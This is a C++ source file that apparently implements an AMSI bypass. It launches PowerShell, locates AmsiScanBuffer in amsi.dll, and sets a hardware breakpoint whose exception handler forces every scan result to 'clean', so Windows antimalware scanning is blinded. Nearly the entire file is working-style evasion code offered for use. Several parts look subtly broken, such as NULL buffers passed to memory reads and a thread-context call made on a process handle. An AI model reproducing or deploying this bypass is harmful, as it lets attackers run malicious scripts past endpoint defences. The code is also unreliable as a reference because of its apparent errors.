#include <windows.h>

#define AMSI_RESULT_CLEAN 0
#define CurrProcHandle (HANDLE)-2

PVOID g_amsiScanBufferPtr = nullptr;

#include <string>
#include <windows.h>
#include <psapi.h>
#include <atlcore.h>
#include <atlconv.h>
#include <TlHelp32.h>

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

typedef ULONG_PTR(WINAPI* REFLECTIVELOADER)(VOID);
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);

#define ReCa reinterpret_cast

//-----------------------------------------------------------------------------
HMODULE GetModuleBaseEx(DWORD pid, const wchar_t* modName)
{
    DWORD* modBase = { 0 };
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W ME32 = { 0 };
        ME32.dwSize = sizeof(ME32);
        if (Module32FirstW(hSnap, &ME32)) {
            do {
                // printf("%ws == %ws ? %i\n", ME32.szModule, modName, wcscmp(ME32.szModule, modName));
                if (wcscmp(ME32.szModule, modName) == 0) {
                    modBase = (DWORD*)ME32.modBaseAddr;
                    break;
                }
            } while (Module32NextW(hSnap, &ME32));
        }
        CloseHandle(hSnap);
    }
    return (HMODULE)modBase;
}

FARPROC WINAPI GetProcAddressR(HANDLE hProcess, HANDLE hModule, LPCSTR lpProcName)
{
    DWORD* uiLibraryAddress = 0;
    FARPROC fpResult = NULL;

    if (hModule == NULL)
        return NULL;

    // a module handle is really its base address
    uiLibraryAddress = (DWORD*)hModule;

    DWORD* uiAddressArray = 0;
    DWORD* uiNameArray = 0;
    DWORD* uiNameOrdinals = 0;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_DATA_DIRECTORY pDataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
    SIZE_T bytesRead = 0;

    ReadProcessMemory(hProcess, (uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew), pNtHeaders, sizeof(PIMAGE_NT_HEADERS), &bytesRead);
    ReadProcessMemory(hProcess, &pNtHeaders->OptionalHeader.DataDirectory[0], pDataDirectory, sizeof(PIMAGE_DATA_DIRECTORY), &bytesRead);
    ReadProcessMemory(hProcess, (uiLibraryAddress + pDataDirectory->VirtualAddress), pExportDirectory, sizeof(PIMAGE_EXPORT_DIRECTORY), &bytesRead);

    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[!] invalid nt header\n");
        exit(1);
    }

    uiAddressArray = (DWORD*)(uiLibraryAddress + pExportDirectory->AddressOfFunctions);
    uiNameArray = (DWORD*)(uiLibraryAddress + pExportDirectory->AddressOfNames);
    uiNameOrdinals = (DWORD*)(uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);

        // import by name...
    DWORD dwCounter = pExportDirectory->NumberOfNames;
    while (dwCounter--)
    {

        char* cpExportedFunctionName = (char*)malloc(MAX_PATH * sizeof(char));
        ReadProcessMemory(hProcess, (uiLibraryAddress + DEREF_32(uiNameArray)), cpExportedFunctionName, sizeof(char) * MAX_PATH, &bytesRead);

        // test if we have a match...
        if (strcmp(cpExportedFunctionName, lpProcName) == 0)
        {
            // use the functions name ordinal as an index into the array of name pointers
            uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

            // calculate the virtual address for the function
            fpResult = (FARPROC)(uiLibraryAddress + DEREF_32(uiAddressArray));

            // finish...
            break;
        }

        // get the next exported function name
        uiNameArray += sizeof(DWORD);

        // get the next exported function name ordinal
        uiNameOrdinals += sizeof(WORD);
    }
    return fpResult;
}
//===============================================================================================//

unsigned long long setBits(unsigned long long dw, int lowBit, int bits, unsigned long long newValue) 
{
    unsigned long long mask = (1UL << bits) - 1UL;
    dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
    return dw;
}

void enableBreakpoint(CONTEXT& ctx, PVOID address, int index) 
{
    switch (index) {
    case 0:
        ctx.Dr0 = (ULONG_PTR)address;
        break;
    case 1:
        ctx.Dr1 = (ULONG_PTR)address;
        break;
    case 2:
        ctx.Dr2 = (ULONG_PTR)address;
        break;
    case 3:
        ctx.Dr3 = (ULONG_PTR)address;
        break;
    }

    //Set bits 16-31 as 0, which sets
    //DR0-DR3 HBP's for execute HBP
    ctx.Dr7 = setBits(ctx.Dr7, 16, 16, 0);

    //Set DRx HBP as enabled for local mode
    ctx.Dr7 = setBits(ctx.Dr7, (index * 2), 1, 1);
    ctx.Dr6 = 0;
}

static void clearHardwareBreakpoint(CONTEXT* ctx, int index) 
{
    //Clear the releveant hardware breakpoint
    switch (index) {
    case 0:
        ctx->Dr0 = 0;
        break;
    case 1:
        ctx->Dr1 = 0;
        break;
    case 2:
        ctx->Dr2 = 0;
        break;
    case 3:
        ctx->Dr3 = 0;
        break;
    }

    //Clear DRx HBP to disable for local mode
    ctx->Dr7 = setBits(ctx->Dr7, (index * 2), 1, 0);
    ctx->Dr6 = 0;
    ctx->EFlags = 0;
}

static ULONG_PTR getArg(CONTEXT* ctx, int index) 
{
#ifdef _WIN64
    switch (index) {
    case 0:
        return ctx->Rcx;
    case 1:
        return ctx->Rdx;
    case 2:
        return ctx->R8;
    case 3:
        return ctx->R9;
    default:
        return *(ULONG_PTR*)(ctx->Rsp + ((index + 1) * 8));
    }
#else
    return *(DWORD_PTR*)(ctx->Esp + (index + 1 * 4));
#endif

}

static ULONG_PTR getReturnAddress(CONTEXT* ctx) 
{
#ifdef _WIN64
    return *(ULONG_PTR*)ctx->Rsp;
#else
    return *(ULONG_PTR*)ctx->Esp;
#endif
}

static void setResult(CONTEXT* ctx, ULONG_PTR result) 
{
#ifdef _WIN64
    ctx->Rax = result;
#else
    ctx->Eax = result;
#endif
}

static void adjustStackPointer(CONTEXT* ctx, int amount) 
{
#ifdef _WIN64
    ctx->Rsp += amount;
#else
    ctx->Esp += amount;
#endif
}

static void setIP(CONTEXT* ctx, ULONG_PTR newIP) 
{
#ifdef _WIN64
    ctx->Rip = newIP;
#else
    ctx->Eip = newIP;
#endif
}

LONG WINAPI exceptionHandler(PEXCEPTION_POINTERS exceptions) 
{

    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP && 
        exceptions->ExceptionRecord->ExceptionAddress == g_amsiScanBufferPtr) 
    {

        //Get the return address by reading the value currently stored at the stack pointer 
        ULONG_PTR returnAddress = getReturnAddress(exceptions->ContextRecord);

        //Get the address of the 5th argument, which is an int* and set it to a clean result
        int* scanResult = (int*)getArg(exceptions->ContextRecord, 5);
        *scanResult = AMSI_RESULT_CLEAN;

        //update the current instruction pointer to the caller of AmsiScanBuffer 
        setIP(exceptions->ContextRecord, returnAddress);

        //We need to adjust the stack pointer accordinly too so that we simulate a ret instruction
        adjustStackPointer(exceptions->ContextRecord, sizeof(PVOID));

        //Set the eax/rax register to 0 (S_OK) indicatring to the caller that AmsiScanBuffer finished successfully 
        setResult(exceptions->ContextRecord, S_OK);

        //Clear the hardware breakpoint, since we are now done with it
        clearHardwareBreakpoint(exceptions->ContextRecord, 0);

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else 
    {
        return EXCEPTION_CONTINUE_SEARCH;
    }
}


HANDLE setupAMSIBypass(HANDLE process, HANDLE amsiScanBufferPointer) 
{
    CONTEXT threadCtx;
    memset(&threadCtx, 0, sizeof(threadCtx));
    threadCtx.ContextFlags = CONTEXT_ALL;

    g_amsiScanBufferPtr = (PVOID)amsiScanBufferPointer;

    if (g_amsiScanBufferPtr == nullptr)
	{
            return nullptr;
    }

    HANDLE hExHandler = AddVectoredExceptionHandler(1, exceptionHandler);

    if (GetThreadContext(process, &threadCtx)) 
    {
        enableBreakpoint(threadCtx, g_amsiScanBufferPtr, 0);
        SetThreadContext(process, &threadCtx);
    }

    return hExHandler;
}

int main()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	if (!CreateProcess(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",   // the path
		NULL,           // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	))
	{
		printf("[!] Error: %i", GetLastError());
		return 1;
	}

    HMODULE hModule = GetModuleBaseEx(pi.dwProcessId, L"amsi.dll");
    if (!hModule)
    {
        printf("[!] Error getting amsi.dll module base\n");
        return 1;
    }
    HANDLE hProc = OpenProcess(PROCESS_VM_READ, FALSE, pi.dwProcessId);
    if (!hProc)
    {
        printf("[!] Error opening handle to process");
        return 1;
    }
    PVOID hProcAddress = (PVOID)GetProcAddressR(hProc, hModule, "AmsiScanBuffer");
	if (!hProcAddress)
	{
		printf("[!] Error getting addr of amsiscanbuffer\n");
        return 1;
	}
	HANDLE hExHandler = setupAMSIBypass(pi.hProcess, hProcAddress);
	if (!hExHandler)
	{
		printf("[!] Error setting exception hanlder\n");
        return 1;
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}